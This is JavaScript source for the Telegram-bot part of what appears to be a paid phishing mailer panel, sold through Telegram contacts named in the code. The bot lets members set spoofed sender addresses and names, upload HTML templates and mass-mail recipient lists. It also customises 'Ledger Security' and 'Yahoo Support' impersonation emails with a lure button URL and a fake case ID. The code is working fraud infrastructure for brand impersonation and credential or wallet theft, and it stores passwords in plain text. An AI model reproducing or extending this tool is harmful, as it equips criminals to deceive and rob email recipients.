    const list = users.map(u => `• *${u.username}* (${u.role})${u.telegramId ? ' - @' + u.telegramId : ' - ⚠️ Not linked'}`).join('\n');
    bot.sendMessage(msg.chat.id, `👤 *Web Panel Users:*\n\n${list}`, { parse_mode: 'Markdown' });
  });

  // ===== ADD MEMBER =====
  bot.onText(/\/addmember (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const tgId = match[1].trim().replace('@', '');
    const team = await readJSON(TEAM_FILE);
    if (team.find(m => m.telegramId === tgId)) return bot.sendMessage(msg.chat.id, '❌ Member already exists.');
    team.push({ id: Date.now().toString(), telegramId: tgId, role: 'member', status: 'active', invitedAt: new Date().toISOString() });
    await writeJSON(TEAM_FILE, team);
    bot.sendMessage(msg.chat.id, `✅ Telegram member @${tgId} added! They can now use the bot.`);
  });

  // ===== REMOVE MEMBER =====
  bot.onText(/\/removemember (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const tgId = match[1].trim().replace('@', '');
    let team = await readJSON(TEAM_FILE);
    const member = team.find(m => m.telegramId === tgId);
    if (!member) return bot.sendMessage(msg.chat.id, '❌ Member not found.');
    team = team.filter(m => m.telegramId !== tgId);
    await writeJSON(TEAM_FILE, team);
    bot.sendMessage(msg.chat.id, `✅ Telegram member @${tgId} removed!`);
  });

  // ===== LIST MEMBERS =====
  bot.onText(/\/members/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const team = await readJSON(TEAM_FILE);
    if (!team.length) return bot.sendMessage(msg.chat.id, '👥 No team members.');
    const list = team.map(m => `• @${m.telegramId} (${m.role}) - ${m.status}`).join('\n');
    bot.sendMessage(msg.chat.id, `👥 *Team Members:*\n\n${list}`, { parse_mode: 'Markdown' });
  });

  // ===== CANCEL =====
  bot.onText(/\/cancel/, (msg) => {
    tgSessions.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, '❌ Operation cancelled.');
  });

  // ===== Handle multi-step sessions =====
  bot.on('message', async (msg) => {
    if (msg.text && msg.text.startsWith('/')) return;
    const session = tgSessions.get(msg.chat.id);
    if (!session) return;
    const username = getUserFromMsg(msg);
    // Allow /link flow for anyone (no team membership required)
    if (!isAllowedUser(username) && session.step !== 'link_username' && session.step !== 'link_password') {
      tgSessions.delete(msg.chat.id);
      return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    }
    const settings = await getSettings();
    const text = msg.text ? msg.text.trim() : '';

    // UPLOAD HTML flow
    if (session.step === 'uploadhtml_name') {
      tgSessions.set(msg.chat.id, { step: 'uploadhtml_wait', name: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Template name: ${text}\n\nStep 2/2: Now send me the HTML file (.html or .htm):`);
    } else if (session.step === 'uploadhtml_wait') {
      // Handle document upload
      if (msg.document) {
        try {
          const fileId = msg.document.file_id;
          const fileName = msg.document.file_name || 'template.html';
          const file = await bot.getFile(fileId);
          const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${file.file_path}`;
          const response = await fetch(fileUrl);
          const htmlContent = await response.text();
          
          const user = findUserByChatId(msg.chat.id);
          const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
          const template = {
            id: Date.now().toString(),
            name: session.name,
            subject: '',
            body: htmlContent,
            html: htmlContent,
            isHtml: true,
            fileName,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString(),
          };
          templates.push(template);
          if (user) {
            await writeUserData(user.id, 'templates', templates);
          } else {
            await writeJSON(TEMPLATES_FILE, templates);
          }
          tgSessions.delete(msg.chat.id);
          bot.sendMessage(msg.chat.id, `✅ HTML template *${session.name}* saved!\n\n📄 File: ${fileName}\n📏 Size: ${(htmlContent.length / 1024).toFixed(1)}KB\n\nUse /sendhtml to send it.`, { parse_mode: 'Markdown' });
        } catch (err) {
          bot.sendMessage(msg.chat.id, `❌ Failed to save HTML: ${err.message}`);
        }
      } else {
        bot.sendMessage(msg.chat.id, '❌ Please send an HTML file (.html or .htm).');
      }
    }
    // SET PROFILE PICTURE flow
    else if (session.step === 'setprofilepic_wait') {
      if (msg.photo && msg.photo.length > 0) {
        try {
          const photo = msg.photo[msg.photo.length - 1];
          const fileId = photo.file_id;
          const file = await bot.getFile(fileId);
          const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${file.file_path}`;
          const response = await fetch(fileUrl);
          const buffer = Buffer.from(await response.arrayBuffer());
          
          const user = findUserByChatId(msg.chat.id);
          if (!user) return bot.sendMessage(msg.chat.id, '❌ Your Telegram is not linked to any web panel account. Use /link to link first.');
          
          // Save profile picture to user data dir
          const userDir = path.join(DATA_DIR, 'users', String(user.id));
          fs.ensureDirSync(userDir);
          const picPath = path.join(userDir, 'profile-pic.jpg');
          fs.writeFileSync(picPath, buffer);
          
          // Update user record
          const users = await readJSON(USERS_FILE);
          const userRecord = users.find(u => String(u.id) === String(user.id));
          if (userRecord) {
            userRecord.profilePic = picPath;
            await writeJSON(USERS_FILE, users);
          }
          
          tgSessions.delete(msg.chat.id);
          bot.sendMessage(msg.chat.id, `✅ Sender profile picture updated!\n\n🖼️ Your profile picture will be used as the sender avatar in emails.`);
        } catch (err) {
          bot.sendMessage(msg.chat.id, `❌ Failed to set profile picture: ${err.message}`);
        }
      } else {
        bot.sendMessage(msg.chat.id, '❌ Please send an image (photo).');
      }
    }
    // SEND HTML flow
    else if (session.step === 'sendhtml_select') {
      const user = findUserByChatId(msg.chat.id);
      const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
      const template = templates.find(t => t.id === text || t.name === text);
      if (!template) return bot.sendMessage(msg.chat.id, '❌ Template not found. Try again:');
      tgSessions.set(msg.chat.id, { step: 'sendhtml_to', templateId: template.id, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Template: *${template.name}*\n\nStep 2/2: Enter the recipient email address:\n\nType /cancel to abort.`, { parse_mode: 'Markdown' });
    } else if (session.step === 'sendhtml_to') {
      if (!text.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email. Try again:');
      try {
        const user = findUserByChatId(msg.chat.id);
        const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
        const template = templates.find(t => t.id === session.templateId);
        if (!template) return bot.sendMessage(msg.chat.id, '❌ Template not found.');
        
        const smtpConf = await getBotSmtpConfig(user);
        const transporter = createTransporter(smtpConf);
        const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
        const fromName = smtpConf.spoofName || user?.senderName || '';
        const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
        await transporter.sendMail({ from: fromStr, to: text, subject: template.subject || 'Message', html: template.html || template.body });
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ HTML template *${template.name}* sent to ${text}!`, { parse_mode: 'Markdown' });
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
      }
    }
    // SET SPOOFED EMAIL flow
    else if (session.step === 'setspoofemail_wait') {
      if (!text.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email address. Try again:');
      try {
        const user = findUserByChatId(msg.chat.id);
        if (!user) return bot.sendMessage(msg.chat.id, '❌ Your Telegram is not linked to any web panel account. Use /link to link first.');
        
        const users = await readJSON(USERS_FILE);
        const userRecord = users.find(u => String(u.id) === String(user.id));
        if (userRecord) {
          userRecord.spoofEmail = text;
          await writeJSON(USERS_FILE, users);
        }
        
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ Spoofed email set to: *${text}*\n\nThis will be displayed as the sender email while your original SMTP credentials are used for sending.`, { parse_mode: 'Markdown' });
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed to set spoofed email: ${err.message}`);
      }
    }
    // SET SENDER NAME flow
    else if (session.step === 'setname_wait') {
      if (!text) return bot.sendMessage(msg.chat.id, '❌ Please send a name.');
      try {
        const user = findUserByChatId(msg.chat.id);
        if (!user) return bot.sendMessage(msg.chat.id, '❌ Your Telegram is not linked to any web panel account. Use /link to link first.');
        
        const users = await readJSON(USERS_FILE);
        const userRecord = users.find(u => String(u.id) === String(user.id));
        if (userRecord) {
          userRecord.senderName = text;
          await writeJSON(USERS_FILE, users);
        }
        
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ Sender name set to: *${text}*\n\nThis will be used as the "From" name in your emails.`, { parse_mode: 'Markdown' });
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed to set sender name: ${err.message}`);
      }
    }
    // SEND EMAIL flow
    else if (session.step === 'send_to') {
      if (!text.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email. Try again:');
      tgSessions.set(msg.chat.id, { step: 'send_subject', to: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Recipient: ${text}\n\nStep 2/3: Enter the subject:`);
    } else if (session.step === 'send_subject') {
      tgSessions.set(msg.chat.id, { step: 'send_body', to: session.to, subject: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Subject: ${text}\n\nStep 3/3: Enter the message body:`);
    } else if (session.step === 'send_body') {
      try {
        const user = findUserByChatId(msg.chat.id);
        const smtpConf = await getBotSmtpConfig(user);
        const transporter = createTransporter(smtpConf);
        const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
        const fromName = smtpConf.spoofName || '';
        const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
        await transporter.sendMail({ from: fromStr, to: session.to, subject: session.subject, text, html: text });
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ Email sent to ${session.to}\nSubject: ${session.subject}`);
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
      }
    }
    // MASS MAIL flow
    else if (session.step === 'mass_recipients') {
      const recipients = text.split(',').map(s => s.trim()).filter(Boolean);
      if (!recipients.length) return bot.sendMessage(msg.chat.id, '❌ No valid emails. Try again:');
      tgSessions.set(msg.chat.id, { step: 'mass_subject', recipients, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ ${recipients.length} recipients added.\n\nStep 2/3: Enter the subject:`);
    } else if (session.step === 'mass_subject') {
      tgSessions.set(msg.chat.id, { step: 'mass_body', recipients: session.recipients, subject: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Subject: ${text}\n\nStep 3/3: Enter the message body:`);
    } else if (session.step === 'mass_body') {
      bot.sendMessage(msg.chat.id, `🚀 Starting mass mail to ${session.recipients.length} recipients...`);
      let sent = 0, failed = 0;
      try {
        const user = findUserByChatId(msg.chat.id);
        const smtpConf = await getBotSmtpConfig(user);
        const transporter = createTransporter(smtpConf);
        const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
        const fromName = smtpConf.spoofName || '';
        const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
        for (const email of session.recipients) {
          try {
            await transporter.sendMail({ from: fromStr, to: email, subject: session.subject, text, html: text });
            sent++;
          } catch { failed++; }
          await new Promise(r => setTimeout(r, 200));
        }
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `📬 Mass mail complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n📊 Total: ${session.recipients.length}`);
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
      }
    }
    // LEDGER flow
    else if (session.step === 'ledger_to') {
      if (!text.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email. Try again:');
      const settings = await getSettings();
      const html = buildLedgerHTML(settings);
      try {
        const user = findUserByChatId(msg.chat.id);
        const smtpConf = await getBotSmtpConfig(user);
        const transporter = createTransporter(smtpConf);
        const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
        const fromName = smtpConf.spoofName || 'Ledger Security';
        const fromStr = `"${fromName}" <${fromEmail}>`;
        await transporter.sendMail({ from: fromStr, to: text, subject: settings.ledgerSubject, html });
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ Ledger template email sent to ${text}`);
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
      }
    }
    // YAHOO flow
    else if (session.step === 'yahoo_to') {
      if (!text.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email. Try again:');
      const settings = await getSettings();
      const html = buildYahooHTML(settings);
      try {
        const user = findUserByChatId(msg.chat.id);
        const smtpConf = await getBotSmtpConfig(user);
        const transporter = createTransporter(smtpConf);
        const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
        const fromName = smtpConf.spoofName || 'Yahoo Support';
        const fromStr = `"${fromName}" <${fromEmail}>`;
        await transporter.sendMail({ from: fromStr, to: text, subject: settings.yahooSubject, html });
        tgSessions.delete(msg.chat.id);
        bot.sendMessage(msg.chat.id, `✅ Yahoo template email sent to ${text}`);
      } catch (err) {
        bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
      }
    }
    // ADD USER flow
    else if (session.step === 'adduser_username') {
      tgSessions.set(msg.chat.id, { step: 'adduser_password', username: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Username: ${text}\n\nStep 2/3: Enter the password:`);
    } else if (session.step === 'adduser_password') {
      tgSessions.set(msg.chat.id, { step: 'adduser_telegram', username: session.username, password: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Password set.\n\nStep 3/3: Enter their Telegram username (without @, or type "skip"):`);
    } else if (session.step === 'adduser_telegram') {
      const users = await readJSON(USERS_FILE);
      if (users.find(u => u.username === session.username)) return bot.sendMessage(msg.chat.id, '❌ User already exists.');
      const tgId = text.toLowerCase() === 'skip' ? '' : text.replace('@', '');
      users.push({ id: Date.now().toString(), username: session.username, password: session.password, role: 'user', telegramId: tgId, telegramChatId: '', createdAt: new Date().toISOString() });
      await writeJSON(USERS_FILE, users);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Web panel user *${session.username}* added!\nUsername: ${session.username}\nPassword: ${session.password}\nTelegram: ${tgId ? '@' + tgId : 'Not linked'}\n\nTo link their Telegram, have them send /link to this bot.`, { parse_mode: 'Markdown' });
    }
    // REMOVE USER flow
    else if (session.step === 'removeuser_username') {
      let users = await readJSON(USERS_FILE);
      const user = users.find(u => u.username === text);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ User not found.');
      if (user.role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Cannot remove the admin user.');
      users = users.filter(u => u.username !== text);
      await writeJSON(USERS_FILE, users);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Web panel user *${text}* removed!`, { parse_mode: 'Markdown' });
    }
    // ADD MEMBER flow
    else if (session.step === 'addmember_username') {
      const tgId = text.replace('@', '');
      const team = await readJSON(TEAM_FILE);
      if (team.find(m => m.telegramId === tgId)) return bot.sendMessage(msg.chat.id, '❌ Member already exists.');
      team.push({ id: Date.now().toString(), telegramId: tgId, role: 'member', status: 'active', invitedAt: new Date().toISOString() });
      await writeJSON(TEAM_FILE, team);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Telegram member @${tgId} added! They can now use the bot.`);
    }
    // REMOVE MEMBER flow
    else if (session.step === 'removemember_username') {
      const tgId = text.replace('@', '');
      let team = await readJSON(TEAM_FILE);
      const member = team.find(m => m.telegramId === tgId);
      if (!member) return bot.sendMessage(msg.chat.id, '❌ Member not found.');
      team = team.filter(m => m.telegramId !== tgId);
      await writeJSON(TEAM_FILE, team);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Telegram member @${tgId} removed!`);
    }
    // SET SENDER flow
    else if (session.step === 'setsender_domain') {
      const validDomains = getSharedSmtpConfigs().map(s => s.domain);
      const domain = text.trim().toLowerCase();
      if (!validDomains.includes(domain)) {
        return bot.sendMessage(msg.chat.id, `❌ Invalid domain. Available: ${validDomains.join(', ')}. Try again:`);
      }
      tgSessions.set(msg.chat.id, { step: 'setsender_prefix', domain, userId: session.userId, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Domain: ${domain}\n\nStep 2/2: Enter the prefix for your sender email (e.g. noreply, support, info):`);
    } else if (session.step === 'setsender_prefix') {
      const prefix = text.trim().toLowerCase().replace(/[^a-z0-9._-]/g, '');
      if (!prefix) return bot.sendMessage(msg.chat.id, '❌ Invalid prefix. Use letters, numbers, dots, hyphens, underscores. Try again:');
      const users = await readJSON(USERS_FILE);
      const user = users.find(u => String(u.id) === String(session.userId));
      if (!user) return bot.sendMessage(msg.chat.id, '❌ User not found.');
      user.senderDomain = session.domain;
      user.senderPrefix = prefix;
      await writeJSON(USERS_FILE, users);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Sender email updated!\n\n📧 New sender: \`${prefix}@${session.domain}\``, { parse_mode: 'Markdown' });
    }
    // LINK flow
    else if (session.step === 'link_username') {
      const users = await readJSON(USERS_FILE);
      const user = users.find(u => u.username === text);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ User not found. Check your username and try again.');
      tgSessions.set(msg.chat.id, { step: 'link_password', username: text, createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Username found: ${text}\n\nStep 2/2: Enter your web panel password:`);
    } else if (session.step === 'link_password') {
      const users = await readJSON(USERS_FILE);
      const user = users.find(u => u.username === session.username && u.password === text);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ Invalid password. Try again:');
      user.telegramId = username;
      user.telegramChatId = String(msg.chat.id);
      await writeJSON(USERS_FILE, users);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Telegram linked to web panel user *${session.username}*!\n\nYou will now receive notifications here and your data is synced.`, { parse_mode: 'Markdown' });
    }
    // LEDGER customization flow
    else if (session.step === 'ledger_subject') {
      settings.ledgerSubject = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'ledger_heading', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Subject set to: ${text}\n\nStep 2/6: Enter the heading:\n(Current: ${settings.ledgerHeading})`);
    } else if (session.step === 'ledger_heading') {
      settings.ledgerHeading = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'ledger_body', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Heading set to: ${text}\n\nStep 3/6: Enter the main body text:\n(Current: ${settings.ledgerBody})`);
    } else if (session.step === 'ledger_body') {
      settings.ledgerBody = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'ledger_button_text', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Body set.\n\nStep 4/6: Enter the button text:\n(Current: ${settings.ledgerButtonText})`);
    } else if (session.step === 'ledger_button_text') {
      settings.ledgerButtonText = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'ledger_button_url', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Button text set to: ${text}\n\nStep 5/6: Enter the button URL:\n(Current: ${settings.ledgerButtonUrl})`);
    } else if (session.step === 'ledger_button_url') {
      settings.ledgerButtonUrl = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'ledger_footer', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Button URL set to: ${text}\n\nStep 6/6: Enter the footer text:\n(Current: ${settings.ledgerFooter})`);
    } else if (session.step === 'ledger_footer') {
      settings.ledgerFooter = text;
      await saveSettings(settings);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Ledger template fully customized!\n\nSubject: ${settings.ledgerSubject}\nHeading: ${settings.ledgerHeading}\nButton: ${settings.ledgerButtonText} -> ${settings.ledgerButtonUrl}\nFooter: ${settings.ledgerFooter}`);
    }
    // YAHOO customization flow
    else if (session.step === 'yahoo_subject') {
      settings.yahooSubject = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'yahoo_heading', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Subject set to: ${text}\n\nStep 2/5: Enter the heading:\n(Current: ${settings.yahooHeading})`);
    } else if (session.step === 'yahoo_heading') {
      settings.yahooHeading = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'yahoo_body', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Heading set to: ${text}\n\nStep 3/5: Enter the body text:\n(Current: ${settings.yahooBody})`);
    } else if (session.step === 'yahoo_body') {
      settings.yahooBody = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'yahoo_caseid', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Body set.\n\nStep 4/5: Enter the Case ID:\n(Current: ${settings.yahooCaseId})`);
    } else if (session.step === 'yahoo_caseid') {
      settings.yahooCaseId = text;
      await saveSettings(settings);
      tgSessions.set(msg.chat.id, { step: 'yahoo_footer', createdAt: Date.now() });
      bot.sendMessage(msg.chat.id, `✅ Case ID set to: ${text}\n\nStep 5/5: Enter the footer text:\n(Current: ${settings.yahooFooter})`);
    } else if (session.step === 'yahoo_footer') {
      settings.yahooFooter = text;
      await saveSettings(settings);
      tgSessions.delete(msg.chat.id);
      bot.sendMessage(msg.chat.id, `✅ Yahoo template fully customized!\n\nSubject: ${settings.yahooSubject}\nHeading: ${settings.yahooHeading}\nCase ID: ${settings.yahooCaseId}\nFooter: ${settings.yahooFooter}`);
    }
  });
}

function initTelegramBot() {
  try {
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN') {
      const TelegramBot = require('node-telegram-bot-api');
      bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
      console.log('✅ Telegram bot initialized');
      setupTelegramBot();
    }
  } catch (err) {
    console.log('⚠️ Telegram bot not configured.');
  }
  return bot;
}

module.exports = {
  initTelegramBot, sendTelegramNotification, getBot: () => bot
};